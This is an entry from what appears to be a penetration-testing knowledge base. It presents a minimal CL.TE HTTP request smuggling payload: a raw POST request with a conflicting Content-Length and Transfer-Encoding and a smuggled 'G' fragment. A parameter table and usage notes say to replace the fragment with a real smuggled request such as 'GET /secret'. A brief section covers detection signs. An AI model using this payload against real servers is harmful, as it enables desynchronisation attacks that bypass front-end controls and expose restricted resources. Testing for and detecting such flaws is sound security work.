---
type: code
language: http
verified: true
platforms:
  - Web
tags:
  - http-smuggling
  - payload
  - cl-te
validated: true
---

# CL-TE-Minimal-Smuggling-Payload

## Code

```http
POST / HTTP/1.1
Host: domain.example.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

## Description

A minimal CL.TE smuggling payload using a very short Content-Length (6 bytes) and chunked encoding to test basic desynchronization. The "G" serves as a simple smuggled fragment, useful for initial probing without complex payloads. Demonstrates how small mismatches can split requests.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Host | Target domain | domain.example.com |
| Content-Length | Short mismatch value for desync | 6 |
| G | Minimal smuggled content (expand to full request) | G (replace with exploit payload) |

## Usage

Send via curl or Burp Suite in a procedure like [[procedures/HTTP-Request-Smuggling-via-CL-TE]] for vulnerability confirmation. Keep connections alive for request chaining. Substitute "G" with actual smuggled HTTP (e.g., GET /secret).

## Detection

- Logs with tiny Content-Length alongside chunked encoding.
- Proxy anomalies like incomplete bodies followed by stray characters.
- Increased 400/411 errors from header conflicts.

## Related

- [[procedures/HTTP-Request-Smuggling-via-CL-TE]]
- [[tools/Burp-Suite]]
